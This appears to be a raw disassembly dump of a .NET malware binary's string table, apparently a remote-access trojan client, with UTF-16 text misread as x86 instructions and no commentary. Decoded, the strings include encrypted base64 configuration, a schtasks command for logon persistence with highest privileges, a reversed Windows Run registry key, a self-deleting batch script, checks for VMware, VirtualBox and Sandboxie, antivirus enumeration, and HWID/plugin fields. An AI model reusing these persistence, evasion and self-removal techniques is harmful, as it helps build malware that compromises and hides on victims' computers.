  40bf72:	44                   	inc    %esp
  40bf73:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40bf77:	00 50 00             	add    %dl,0x0(%eax)
  40bf7a:	47                   	inc    %edi
  40bf7b:	00 2b                	add    %ch,(%ebx)
  40bf7d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bf80:	5a                   	pop    %edx
  40bf81:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40bf85:	00 72 00             	add    %dh,0x0(%edx)
  40bf88:	39 00                	cmp    %eax,(%eax)
  40bf8a:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40bf8e:	4e                   	dec    %esi
  40bf8f:	00 41 00             	add    %al,0x0(%ecx)
  40bf92:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bf97:	03 33                	add    (%ebx),%esi
  40bf99:	00 00                	add    %al,(%eax)
  40bf9b:	80 b1 77 00 6e 00 46 	xorb   $0x46,0x6e0077(%ecx)
  40bfa2:	00 48 00             	add    %cl,0x0(%eax)
  40bfa5:	63 00                	arpl   %eax,(%eax)
  40bfa7:	30 00                	xor    %al,(%eax)
  40bfa9:	4c                   	dec    %esp
  40bfaa:	00 62 00             	add    %ah,0x0(%edx)
  40bfad:	75 00                	jne    0x40bfaf
  40bfaf:	70 00                	jo     0x40bfb1
  40bfb1:	4f                   	dec    %edi
  40bfb2:	00 38                	add    %bh,(%eax)
  40bfb4:	00 4d 00             	add    %cl,0x0(%ebp)
  40bfb7:	39 00                	cmp    %eax,(%eax)
  40bfb9:	4a                   	dec    %edx
  40bfba:	00 62 00             	add    %ah,0x0(%edx)
  40bfbd:	48                   	dec    %eax
  40bfbe:	00 4a 00             	add    %cl,0x0(%edx)
  40bfc1:	45                   	inc    %ebp
  40bfc2:	00 78 00             	add    %bh,0x0(%eax)
  40bfc5:	2b 00                	sub    (%eax),%eax
  40bfc7:	4f                   	dec    %edi
  40bfc8:	00 49 00             	add    %cl,0x0(%ecx)
  40bfcb:	50                   	push   %eax
  40bfcc:	00 58 00             	add    %bl,0x0(%eax)
  40bfcf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfd0:	00 55 00             	add    %dl,0x0(%ebp)
  40bfd3:	39 00                	cmp    %eax,(%eax)
  40bfd5:	51                   	push   %ecx
  40bfd6:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40bfda:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40bfde:	00 6f 00             	add    %ch,0x0(%edi)
  40bfe1:	54                   	push   %esp
  40bfe2:	00 75 00             	add    %dh,0x0(%ebp)
  40bfe5:	34 00                	xor    $0x0,%al
  40bfe7:	77 00                	ja     0x40bfe9
  40bfe9:	55                   	push   %ebp
  40bfea:	00 32                	add    %dh,(%edx)
  40bfec:	00 6b 00             	add    %ch,0x0(%ebx)
  40bfef:	33 00                	xor    (%eax),%eax
  40bff1:	56                   	push   %esi
  40bff2:	00 36                	add    %dh,(%esi)
  40bff4:	00 36                	add    %dh,(%esi)
  40bff6:	00 47 00             	add    %al,0x0(%edi)
  40bff9:	73 00                	jae    0x40bffb
  40bffb:	2f                   	das
  40bffc:	00 61 00             	add    %ah,0x0(%ecx)
  40bfff:	71 00                	jno    0x40c001
  40c001:	4a                   	dec    %edx
  40c002:	00 67 00             	add    %ah,0x0(%edi)
  40c005:	67 00 2f             	add    %ch,(%bx)
  40c008:	00 78 00             	add    %bh,0x0(%eax)
  40c00b:	34 00                	xor    $0x0,%al
  40c00d:	38 00                	cmp    %al,(%eax)
  40c00f:	50                   	push   %eax
  40c010:	00 4a 00             	add    %cl,0x0(%edx)
  40c013:	77 00                	ja     0x40c015
  40c015:	74 00                	je     0x40c017
  40c017:	71 00                	jno    0x40c019
  40c019:	6d                   	insl   (%dx),%es:(%edi)
  40c01a:	00 55 00             	add    %dl,0x0(%ebp)
  40c01d:	44                   	inc    %esp
  40c01e:	00 67 00             	add    %ah,0x0(%edi)
  40c021:	2b 00                	sub    (%eax),%eax
  40c023:	68 00 62 00 6e       	push   $0x6e006200
  40c028:	00 71 00             	add    %dh,0x0(%ecx)
  40c02b:	57                   	push   %edi
  40c02c:	00 6b 00             	add    %ch,0x0(%ebx)
  40c02f:	31 00                	xor    %eax,(%eax)
  40c031:	71 00                	jno    0x40c033
  40c033:	59                   	pop    %ecx
  40c034:	00 66 00             	add    %ah,0x0(%esi)
  40c037:	32 00                	xor    (%eax),%al
  40c039:	79 00                	jns    0x40c03b
  40c03b:	77 00                	ja     0x40c03d
  40c03d:	58                   	pop    %eax
  40c03e:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40c042:	00 67 00             	add    %ah,0x0(%edi)
  40c045:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40c049:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c04e:	09 6e 00             	or     %ebp,0x0(%esi)
  40c051:	75 00                	jne    0x40c053
  40c053:	6c                   	insb   (%dx),%es:(%edi)
  40c054:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c058:	01 00                	add    %eax,(%eax)
  40c05a:	03 3a                	add    (%edx),%edi
  40c05c:	00 00                	add    %al,(%eax)
  40c05e:	0d 50 00 61 00       	or     $0x610050,%eax
  40c063:	63 00                	arpl   %eax,(%eax)
  40c065:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c068:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c06c:	09 50 00             	or     %edx,0x0(%eax)
  40c06f:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c075:	00 0f                	add    %cl,(%edi)
  40c077:	4d                   	dec    %ebp
  40c078:	00 65 00             	add    %ah,0x0(%ebp)
  40c07b:	73 00                	jae    0x40c07d
  40c07d:	73 00                	jae    0x40c07f
  40c07f:	61                   	popa
  40c080:	00 67 00             	add    %ah,0x0(%edi)
  40c083:	65 00 00             	add    %al,%gs:(%eax)
  40c086:	07                   	pop    %es
  40c087:	63 00                	arpl   %eax,(%eax)
  40c089:	6d                   	insl   (%dx),%es:(%edi)
  40c08a:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c08e:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c094:	00 73 00             	add    %dh,0x0(%ebx)
  40c097:	63 00                	arpl   %eax,(%eax)
  40c099:	68 00 74 00 61       	push   $0x61007400
  40c09e:	00 73 00             	add    %dh,0x0(%ebx)
  40c0a1:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c0a4:	00 20                	add    %ah,(%eax)
  40c0a6:	00 2f                	add    %ch,(%edi)
  40c0a8:	00 63 00             	add    %ah,0x0(%ebx)
  40c0ab:	72 00                	jb     0x40c0ad
  40c0ad:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c0b1:	74 00                	je     0x40c0b3
  40c0b3:	65 00 20             	add    %ah,%gs:(%eax)
  40c0b6:	00 2f                	add    %ch,(%edi)
  40c0b8:	00 66 00             	add    %ah,0x0(%esi)
  40c0bb:	20 00                	and    %al,(%eax)
  40c0bd:	2f                   	das
  40c0be:	00 73 00             	add    %dh,0x0(%ebx)
  40c0c1:	63 00                	arpl   %eax,(%eax)
  40c0c3:	20 00                	and    %al,(%eax)
  40c0c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0c6:	00 6e 00             	add    %ch,0x0(%esi)
  40c0c9:	6c                   	insb   (%dx),%es:(%edi)
  40c0ca:	00 6f 00             	add    %ch,0x0(%edi)
  40c0cd:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c0d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0d2:	00 20                	add    %ah,(%eax)
  40c0d4:	00 2f                	add    %ch,(%edi)
  40c0d6:	00 72 00             	add    %dh,0x0(%edx)
  40c0d9:	6c                   	insb   (%dx),%es:(%edi)
  40c0da:	00 20                	add    %ah,(%eax)
  40c0dc:	00 68 00             	add    %ch,0x0(%eax)
  40c0df:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c0e5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c0e9:	74 00                	je     0x40c0eb
  40c0eb:	20 00                	and    %al,(%eax)
  40c0ed:	2f                   	das
  40c0ee:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c0f2:	00 20                	add    %ah,(%eax)
  40c0f4:	00 22                	add    %ah,(%edx)
  40c0f6:	00 00                	add    %al,(%eax)
  40c0f8:	11 22                	adc    %esp,(%edx)
  40c0fa:	00 20                	add    %ah,(%eax)
  40c0fc:	00 2f                	add    %ch,(%edi)
  40c0fe:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c102:	00 20                	add    %ah,(%eax)
  40c104:	00 27                	add    %ah,(%edi)
  40c106:	00 22                	add    %ah,(%edx)
  40c108:	00 01                	add    %al,(%ecx)
  40c10a:	13 22                	adc    (%edx),%esp
  40c10c:	00 27                	add    %ah,(%edi)
  40c10e:	00 20                	add    %ah,(%eax)
  40c110:	00 26                	add    %ah,(%esi)
  40c112:	00 20                	add    %ah,(%eax)
  40c114:	00 65 00             	add    %ah,0x0(%ebp)
  40c117:	78 00                	js     0x40c119
  40c119:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c11f:	5c                   	pop    %esp
  40c120:	00 6e 00             	add    %ch,0x0(%esi)
  40c123:	75 00                	jne    0x40c125
  40c125:	52                   	push   %edx
  40c126:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c12a:	00 6f 00             	add    %ch,0x0(%edi)
  40c12d:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c133:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c137:	74 00                	je     0x40c139
  40c139:	6e                   	outsb  %ds:(%esi),(%dx)
  40c13a:	00 65 00             	add    %ah,0x0(%ebp)
  40c13d:	72 00                	jb     0x40c13f
  40c13f:	72 00                	jb     0x40c141
  40c141:	75 00                	jne    0x40c143
  40c143:	43                   	inc    %ebx
  40c144:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c148:	00 77 00             	add    %dh,0x0(%edi)
  40c14b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c14c:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c150:	00 69 00             	add    %ch,0x0(%ecx)
  40c153:	57                   	push   %edi
  40c154:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c158:	00 66 00             	add    %ah,0x0(%esi)
  40c15b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c15c:	00 73 00             	add    %dh,0x0(%ebx)
  40c15f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c160:	00 72 00             	add    %dh,0x0(%edx)
  40c163:	63 00                	arpl   %eax,(%eax)
  40c165:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c16b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c16f:	61                   	popa
  40c170:	00 77 00             	add    %dh,0x0(%edi)
  40c173:	74 00                	je     0x40c175
  40c175:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c179:	53                   	push   %ebx
  40c17a:	00 00                	add    %al,(%eax)
  40c17c:	03 22                	add    (%edx),%esp
  40c17e:	00 00                	add    %al,(%eax)
  40c180:	09 2e                	or     %ebp,(%esi)
  40c182:	00 62 00             	add    %ah,0x0(%edx)
  40c185:	61                   	popa
  40c186:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c18a:	13 40 00             	adc    0x0(%eax),%eax
  40c18d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c191:	68 00 6f 00 20       	push   $0x20006f00
  40c196:	00 6f 00             	add    %ch,0x0(%edi)
  40c199:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c19d:	00 1f                	add    %bl,(%edi)
  40c19f:	74 00                	je     0x40c1a1
  40c1a1:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c1a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1a8:	00 75 00             	add    %dh,0x0(%ebp)
  40c1ab:	74 00                	je     0x40c1ad
  40c1ad:	20 00                	and    %al,(%eax)
  40c1af:	33 00                	xor    (%eax),%eax
  40c1b1:	20 00                	and    %al,(%eax)
  40c1b3:	3e 00 20             	add    %ah,%ds:(%eax)
  40c1b6:	00 4e 00             	add    %cl,0x0(%esi)
  40c1b9:	55                   	push   %ebp
  40c1ba:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c1be:	15 53 00 54 00       	adc    $0x540053,%eax
  40c1c3:	41                   	inc    %ecx
  40c1c4:	00 52 00             	add    %dl,0x0(%edx)
  40c1c7:	54                   	push   %esp
  40c1c8:	00 20                	add    %ah,(%eax)
  40c1ca:	00 22                	add    %ah,(%edx)
  40c1cc:	00 22                	add    %ah,(%edx)
  40c1ce:	00 20                	add    %ah,(%eax)
  40c1d0:	00 22                	add    %ah,(%edx)
  40c1d2:	00 00                	add    %al,(%eax)
  40c1d4:	07                   	pop    %es
  40c1d5:	43                   	inc    %ebx
  40c1d6:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c1da:	00 00                	add    %al,(%eax)
  40c1dc:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c1e0:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c1e4:	00 22                	add    %ah,(%edx)
  40c1e6:	00 00                	add    %al,(%eax)
  40c1e8:	0f 22 00             	mov    %eax,%cr0
  40c1eb:	20 00                	and    %al,(%eax)
  40c1ed:	2f                   	das
  40c1ee:	00 66 00             	add    %ah,0x0(%esi)
  40c1f1:	20 00                	and    %al,(%eax)
  40c1f3:	2f                   	das
  40c1f4:	00 71 00             	add    %dh,0x0(%ecx)
  40c1f7:	00 05 78 00 70 00    	add    %al,0x700078
  40c1fd:	00 45 53             	add    %al,0x53(%ebp)
  40c200:	00 65 00             	add    %ah,0x0(%ebp)
  40c203:	6c                   	insb   (%dx),%es:(%edi)
  40c204:	00 65 00             	add    %ah,0x0(%ebp)
  40c207:	63 00                	arpl   %eax,(%eax)
  40c209:	74 00                	je     0x40c20b
  40c20b:	20 00                	and    %al,(%eax)
  40c20d:	2a 00                	sub    (%eax),%al
  40c20f:	20 00                	and    %al,(%eax)
  40c211:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c215:	6f                   	outsl  %ds:(%esi),(%dx)
  40c216:	00 6d 00             	add    %ch,0x0(%ebp)
  40c219:	20 00                	and    %al,(%eax)
  40c21b:	57                   	push   %edi
  40c21c:	00 69 00             	add    %ch,0x0(%ecx)
  40c21f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c220:	00 33                	add    %dh,(%ebx)
  40c222:	00 32                	add    %dh,(%edx)
  40c224:	00 5f 00             	add    %bl,0x0(%edi)
  40c227:	43                   	inc    %ebx
  40c228:	00 6f 00             	add    %ch,0x0(%edi)
  40c22b:	6d                   	insl   (%dx),%es:(%edi)
  40c22c:	00 70 00             	add    %dh,0x0(%eax)
  40c22f:	75 00                	jne    0x40c231
  40c231:	74 00                	je     0x40c233
  40c233:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c237:	53                   	push   %ebx
  40c238:	00 79 00             	add    %bh,0x0(%ecx)
  40c23b:	73 00                	jae    0x40c23d
  40c23d:	74 00                	je     0x40c23f
  40c23f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c243:	00 19                	add    %bl,(%ecx)
  40c245:	4d                   	dec    %ebp
  40c246:	00 61 00             	add    %ah,0x0(%ecx)
  40c249:	6e                   	outsb  %ds:(%esi),(%dx)
  40c24a:	00 75 00             	add    %dh,0x0(%ebp)
  40c24d:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c251:	63 00                	arpl   %eax,(%eax)
  40c253:	74 00                	je     0x40c255
  40c255:	75 00                	jne    0x40c257
  40c257:	72 00                	jb     0x40c259
  40c259:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c25d:	00 2b                	add    %ch,(%ebx)
  40c25f:	6d                   	insl   (%dx),%es:(%edi)
  40c260:	00 69 00             	add    %ch,0x0(%ecx)
  40c263:	63 00                	arpl   %eax,(%eax)
  40c265:	72 00                	jb     0x40c267
  40c267:	6f                   	outsl  %ds:(%esi),(%dx)
  40c268:	00 73 00             	add    %dh,0x0(%ebx)
  40c26b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c26c:	00 66 00             	add    %ah,0x0(%esi)
  40c26f:	74 00                	je     0x40c271
  40c271:	20 00                	and    %al,(%eax)
  40c273:	63 00                	arpl   %eax,(%eax)
  40c275:	6f                   	outsl  %ds:(%esi),(%dx)
  40c276:	00 72 00             	add    %dh,0x0(%edx)
  40c279:	70 00                	jo     0x40c27b
  40c27b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c27c:	00 72 00             	add    %dh,0x0(%edx)
  40c27f:	61                   	popa
  40c280:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c284:	00 6f 00             	add    %ch,0x0(%edi)
  40c287:	6e                   	outsb  %ds:(%esi),(%dx)
  40c288:	00 00                	add    %al,(%eax)
  40c28a:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c28d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c28e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c292:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c296:	0f 56 00             	orps   (%eax),%xmm0
  40c299:	49                   	dec    %ecx
  40c29a:	00 52 00             	add    %dl,0x0(%edx)
  40c29d:	54                   	push   %esp
  40c29e:	00 55 00             	add    %dl,0x0(%ebp)
  40c2a1:	41                   	inc    %ecx
  40c2a2:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c2a6:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c2ab:	77 00                	ja     0x40c2ad
  40c2ad:	61                   	popa
  40c2ae:	00 72 00             	add    %dh,0x0(%edx)
  40c2b1:	65 00 00             	add    %al,%gs:(%eax)
  40c2b4:	15 56 00 69 00       	adc    $0x690056,%eax
  40c2b9:	72 00                	jb     0x40c2bb
  40c2bb:	74 00                	je     0x40c2bd
  40c2bd:	75 00                	jne    0x40c2bf
  40c2bf:	61                   	popa
  40c2c0:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c2c4:	00 6f 00             	add    %ch,0x0(%edi)
  40c2c7:	78 00                	js     0x40c2c9
  40c2c9:	00 17                	add    %dl,(%edi)
  40c2cb:	53                   	push   %ebx
  40c2cc:	00 62 00             	add    %ah,0x0(%edx)
  40c2cf:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c2d5:	6c                   	insb   (%dx),%es:(%edi)
  40c2d6:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c2da:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c2de:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c2e2:	11 45 00             	adc    %eax,0x0(%ebp)
  40c2e5:	72 00                	jb     0x40c2e7
  40c2e7:	72 00                	jb     0x40c2e9
  40c2e9:	20 00                	and    %al,(%eax)
  40c2eb:	48                   	dec    %eax
  40c2ec:	00 57 00             	add    %dl,0x0(%edi)
  40c2ef:	49                   	dec    %ecx
  40c2f0:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c2f4:	05 78 00 32 00       	add    $0x320078,%eax
  40c2f9:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c2ff:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c305:	74 00                	je     0x40c307
  40c307:	49                   	dec    %ecx
  40c308:	00 6e 00             	add    %ch,0x0(%esi)
  40c30b:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c30f:	00 09                	add    %cl,(%ecx)
  40c311:	48                   	dec    %eax
  40c312:	00 57 00             	add    %dl,0x0(%edi)
  40c315:	49                   	dec    %ecx
  40c316:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c31a:	09 55 00             	or     %edx,0x0(%ebp)
  40c31d:	73 00                	jae    0x40c31f
  40c31f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c323:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c329:	00 13                	add    %dl,(%ebx)
  40c32b:	4d                   	dec    %ebp
  40c32c:	00 69 00             	add    %ch,0x0(%ecx)
  40c32f:	63 00                	arpl   %eax,(%eax)
  40c331:	72 00                	jb     0x40c333
  40c333:	6f                   	outsl  %ds:(%esi),(%dx)
  40c334:	00 73 00             	add    %dh,0x0(%ebx)
  40c337:	6f                   	outsl  %ds:(%esi),(%dx)
  40c338:	00 66 00             	add    %ah,0x0(%esi)
  40c33b:	74 00                	je     0x40c33d
  40c33d:	00 03                	add    %al,(%ebx)
  40c33f:	20 00                	and    %al,(%eax)
  40c341:	00 09                	add    %cl,(%ecx)
  40c343:	54                   	push   %esp
  40c344:	00 72 00             	add    %dh,0x0(%edx)
  40c347:	75 00                	jne    0x40c349
  40c349:	65 00 00             	add    %al,%gs:(%eax)
  40c34c:	0b 36                	or     (%esi),%esi
  40c34e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c351:	62 00                	bound  %eax,(%eax)
  40c353:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c359:	46                   	inc    %esi
  40c35a:	00 61 00             	add    %ah,0x0(%ecx)
  40c35d:	6c                   	insb   (%dx),%es:(%edi)
  40c35e:	00 73 00             	add    %dh,0x0(%ebx)
  40c361:	65 00 00             	add    %al,%gs:(%eax)
  40c364:	0b 33                	or     (%ebx),%esi
  40c366:	00 32                	add    %dh,(%edx)
  40c368:	00 62 00             	add    %ah,0x0(%edx)
  40c36b:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c371:	50                   	push   %eax
  40c372:	00 61 00             	add    %ah,0x0(%ecx)
  40c375:	74 00                	je     0x40c377
  40c377:	68 00 00 0f 56       	push   $0x560f0000
  40c37c:	00 65 00             	add    %ah,0x0(%ebp)
  40c37f:	72 00                	jb     0x40c381
  40c381:	73 00                	jae    0x40c383
  40c383:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c389:	00 0b                	add    %cl,(%ebx)
  40c38b:	41                   	inc    %ecx
  40c38c:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c390:	00 69 00             	add    %ch,0x0(%ecx)
  40c393:	6e                   	outsb  %ds:(%esi),(%dx)
  40c394:	00 00                	add    %al,(%eax)
  40c396:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c39a:	00 75 00             	add    %dh,0x0(%ebp)
  40c39d:	65 00 00             	add    %al,%gs:(%eax)
  40c3a0:	0b 66 00             	or     0x0(%esi),%esp
  40c3a3:	61                   	popa
  40c3a4:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c3a8:	00 65 00             	add    %ah,0x0(%ebp)
  40c3ab:	00 17                	add    %dl,(%edi)
  40c3ad:	50                   	push   %eax
  40c3ae:	00 65 00             	add    %ah,0x0(%ebp)
  40c3b1:	72 00                	jb     0x40c3b3
  40c3b3:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3b7:	72 00                	jb     0x40c3b9
  40c3b9:	6d                   	insl   (%dx),%es:(%edi)
  40c3ba:	00 61 00             	add    %ah,0x0(%ecx)
  40c3bd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3be:	00 63 00             	add    %ah,0x0(%ebx)
  40c3c1:	65 00 00             	add    %al,%gs:(%eax)
  40c3c4:	11 50 00             	adc    %edx,0x0(%eax)
  40c3c7:	61                   	popa
  40c3c8:	00 73 00             	add    %dh,0x0(%ebx)
  40c3cb:	74 00                	je     0x40c3cd
  40c3cd:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c3d1:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c3d7:	41                   	inc    %ecx
  40c3d8:	00 6e 00             	add    %ch,0x0(%esi)
  40c3db:	74 00                	je     0x40c3dd
  40c3dd:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c3e3:	72 00                	jb     0x40c3e5
  40c3e5:	75 00                	jne    0x40c3e7
  40c3e7:	73 00                	jae    0x40c3e9
  40c3e9:	00 13                	add    %dl,(%ebx)
  40c3eb:	49                   	dec    %ecx
  40c3ec:	00 6e 00             	add    %ch,0x0(%esi)
  40c3ef:	73 00                	jae    0x40c3f1
  40c3f1:	74 00                	je     0x40c3f3
  40c3f3:	61                   	popa
  40c3f4:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c3f8:	00 65 00             	add    %ah,0x0(%ebp)
  40c3fb:	64 00 00             	add    %al,%fs:(%eax)
  40c3fe:	09 50 00             	or     %edx,0x0(%eax)
  40c401:	6f                   	outsl  %ds:(%esi),(%dx)
  40c402:	00 6e 00             	add    %ch,0x0(%esi)
  40c405:	67 00 00             	add    %al,(%bx,%si)
  40c408:	0b 47 00             	or     0x0(%edi),%eax
  40c40b:	72 00                	jb     0x40c40d
  40c40d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c40e:	00 75 00             	add    %dh,0x0(%ebp)
  40c411:	70 00                	jo     0x40c413
  40c413:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c419:	00 2b                	add    %ch,(%ebx)
  40c41b:	5c                   	pop    %esp
  40c41c:	00 72 00             	add    %dh,0x0(%edx)
  40c41f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c420:	00 6f 00             	add    %ch,0x0(%edi)
  40c423:	74 00                	je     0x40c425
  40c425:	5c                   	pop    %esp
  40c426:	00 53 00             	add    %dl,0x0(%ebx)
  40c429:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c42d:	75 00                	jne    0x40c42f
  40c42f:	72 00                	jb     0x40c431
  40c431:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c437:	43                   	inc    %ebx
  40c438:	00 65 00             	add    %ah,0x0(%ebp)
  40c43b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c43c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c440:	00 72 00             	add    %dh,0x0(%edx)
  40c443:	32 00                	xor    (%eax),%al
  40c445:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c44b:	6c                   	insb   (%dx),%es:(%edi)
  40c44c:	00 65 00             	add    %ah,0x0(%ebp)
  40c44f:	63 00                	arpl   %eax,(%eax)
  40c451:	74 00                	je     0x40c453
  40c453:	20 00                	and    %al,(%eax)
  40c455:	2a 00                	sub    (%eax),%al
  40c457:	20 00                	and    %al,(%eax)
  40c459:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c45d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c45e:	00 6d 00             	add    %ch,0x0(%ebp)
  40c461:	20 00                	and    %al,(%eax)
  40c463:	41                   	inc    %ecx
  40c464:	00 6e 00             	add    %ch,0x0(%esi)
  40c467:	74 00                	je     0x40c469
  40c469:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c46f:	72 00                	jb     0x40c471
  40c471:	75 00                	jne    0x40c473
  40c473:	73 00                	jae    0x40c475
  40c475:	50                   	push   %eax
  40c476:	00 72 00             	add    %dh,0x0(%edx)
  40c479:	6f                   	outsl  %ds:(%esi),(%dx)
  40c47a:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c47e:	00 63 00             	add    %ah,0x0(%ebx)
  40c481:	74 00                	je     0x40c483
  40c483:	00 17                	add    %dl,(%edi)
  40c485:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c489:	73 00                	jae    0x40c48b
  40c48b:	70 00                	jo     0x40c48d
  40c48d:	6c                   	insb   (%dx),%es:(%edi)
  40c48e:	00 61 00             	add    %ah,0x0(%ecx)
  40c491:	79 00                	jns    0x40c493
  40c493:	4e                   	dec    %esi
  40c494:	00 61 00             	add    %ah,0x0(%ecx)
  40c497:	6d                   	insl   (%dx),%es:(%edi)
  40c498:	00 65 00             	add    %ah,0x0(%ebp)
  40c49b:	00 07                	add    %al,(%edi)
  40c49d:	4e                   	dec    %esi
  40c49e:	00 2f                	add    %ch,(%edi)
  40c4a0:	00 41 00             	add    %al,0x0(%ecx)
  40c4a3:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c4a9:	00 13                	add    %dl,(%ebx)
  40c4ab:	53                   	push   %ebx
  40c4ac:	00 6f 00             	add    %ch,0x0(%edi)
  40c4af:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c4b4:	00 61 00             	add    %ah,0x0(%ecx)
  40c4b7:	72 00                	jb     0x40c4b9
  40c4b9:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c4be:	09 70 00             	or     %esi,0x0(%eax)
  40c4c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4c2:	00 6e 00             	add    %ch,0x0(%esi)
  40c4c5:	67 00 00             	add    %al,(%bx,%si)
  40c4c8:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c4cd:	75 00                	jne    0x40c4cf
  40c4cf:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c4d3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4d4:	00 00                	add    %al,(%eax)
  40c4d6:	15 73 00 61 00       	adc    $0x610073,%eax
  40c4db:	76 00                	jbe    0x40c4dd
  40c4dd:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c4e1:	6c                   	insb   (%dx),%es:(%edi)
  40c4e2:	00 75 00             	add    %dh,0x0(%ebp)
